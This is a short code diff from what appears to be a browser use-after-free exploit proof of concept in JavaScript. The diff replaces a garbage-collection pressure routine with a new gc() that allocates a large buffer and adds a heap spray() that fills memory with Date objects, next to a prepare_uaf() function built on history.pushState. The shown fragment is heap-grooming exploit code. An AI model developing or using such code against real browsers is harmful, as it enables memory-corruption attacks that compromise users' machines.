@@ -28,7 +28,7 @@
  input.style.top = "-100px";
  let foo = document.body.appendChild(document.createElement("a"));
  foo.id = "foo";
- let pressure = null;
+ /*let pressure = null;
  function gc(num_loop) {
    pressure = Array(100);
    for (let i = 0; i < num_loop; i++) {
@@ -38,10 +38,20 @@
        pressure = Array(100);
    }
    pressure = null;
- }
+ }*/
  function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
  }
+ function gc() {
+     new Uint8Array(4 * 1024 * 1024);
+ }
+ function spray() {
+     const tmp = [];
+     for (let j = 0; j < 1024; j++) {
+         const d = new Date(0xbeef);
+         tmp.push(d);
+     }
+ } 
  function prepare_uaf() {
     history.pushState('state0', '');
     for (let i = 0; i < num_space; i++) {
